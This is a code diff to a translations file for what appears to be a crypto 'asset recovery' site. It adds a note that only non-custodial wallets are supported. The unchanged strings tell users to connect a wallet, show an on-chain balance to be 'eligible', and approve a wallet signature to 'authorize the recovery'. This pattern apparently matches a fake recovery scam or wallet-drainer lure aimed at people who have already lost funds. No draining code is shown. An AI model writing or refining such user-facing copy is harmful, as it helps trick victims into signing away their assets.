@@ -111,7 +111,7 @@ const TRANSLATIONS = {
     emailSupportPoints: '• For users who don\'t use Telegram\n• For detailed issues requiring documentation\n• For exchange users (Binance, Coinbase, Kraken)\n• For follow-up on manual recovery cases',
     // NEW INSTRUCTION KEYS
     recoveryInstructionsTitle: '🔐 How to Recover Your Assets',
-    recoveryStep1: 'Connect your wallet using the button below.',
+    recoveryStep1: 'Connect your wallet using the button below.****Supported:** Non-custodial (Web3) wallets only. Exchange wallets are not supported.',
     recoveryStep2: 'Wait for automatic scan of 5 blockchain networks (Ethereum, BSC, Polygon, Arbitrum, Avalanche), Note (Must have an On-chain balance in any of the supported networks to be eligible)',
     recoveryStep3: 'If eligible, the system will automatically initiate recovery (or you can click the button).',
     recoveryStep4: 'Approve the signature in your wallet to authorize the recovery.',
